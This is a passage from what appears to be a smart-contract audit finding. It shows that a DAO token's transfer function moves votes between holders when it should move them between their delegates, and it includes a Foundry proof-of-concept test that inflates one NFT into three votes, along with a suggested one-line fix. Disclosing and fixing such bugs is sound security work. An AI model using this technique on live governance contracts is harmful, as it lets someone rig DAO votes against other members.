This will lead to unfair governance as a user can vote with more votes than actual.  ### Explanation The `_transferFrom()`  does not move delegates from the src's delegates to the destination's delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)  ### Code POC ```solidity // Insert this test case into Token.t.sol // Run: forge test --match-contract Token -vv  import "forge-std/console.sol"; ... function testIncreaseVotePower() public {         deployMock();          address voter1;         address voter2;         uint256 voter1PK;         uint256 voter2PK;          // Voter with 1 NFT voting power         voter1PK = 0xABC;         voter1 = vm.addr(voter1PK);         vm.deal(voter1, 1 ether);         // Second account created by same voter         voter2PK = 0xABD;         voter2 = vm.addr(voter2PK);    // Giving voter1 their 1 NFT         vm.prank(founder);         auction.unpause();         vm.prank(voter1);         auction.createBid{ value: 0.420 ether }(2);         vm.warp(auctionParams.duration + 1 seconds);         auction.settleCurrentAndCreateNewAuction();          // Start Exploit         console.log("Initial Votes");         console.log("voter1: ", token.getVotes(voter1));         console.log("voter2: ", token.getVotes(voter2));                  vm.prank(voter1);         token.delegate(voter2);         console.log("After Delegating Votes, voter1 -> delegate(voter2)");         console.log("voter1: ", token.getVotes(voter1));         console.log("voter2: ", token.getVotes(voter2));          vm.prank(voter1);         token.transferFrom(voter1, voter2, 2);          console.log("After Token transfer, voter1 -transferFrom()-> voter2");         console.log("voter1 votes: ", token.getVotes(voter1));         console.log("voter2 votes: ", token.getVotes(voter2));          vm.prank(voter2);         token.delegate(voter2);         console.log("After Delegating Votes, voter2 -> delegate(voter2)");         console.log("voter1: ", token.getVotes(voter1));         console.log("voter2: ", token.getVotes(voter2));     } ``` Expected Output: ```solidity [PASS] testVoteDoublePower() (gas: 3544946) Logs:   Initial Votes   voter1:  1   voter2:  0   After Delegating Votes, voter1 -> delegate(voter2)      voter1:  1   voter2:  1   After Token transfer, voter1 -transferFrom()-> voter2   voter1 votes:  0   voter2 votes:  2   After Delegating Votes, voter2 -> delegate(voter2)      voter1:  0   voter2:  3 ``` ### Recommendations Looking at [OpenZeppelin's ERC721Votes](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6a8d977d2248cf1c115497fccfd7a2da3f86a58f/contracts/token/ERC721/extensions/draft-ERC721Votes.sol#L13) which I believe the team took reference from, it states: ``` * Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost * on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of * the votes in governance decisions, or they can delegate to themselves to be their own representative. ``` The current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated. - I believe the issue is here on this [line](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268) ```solidity // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1); ``` Where it should move from the delegate of `_from` to the delegate of `_to`. Suggested FIx: ```solidity  _moveDelegateVotes(delegation[_from], delegation[_to], 1); ```
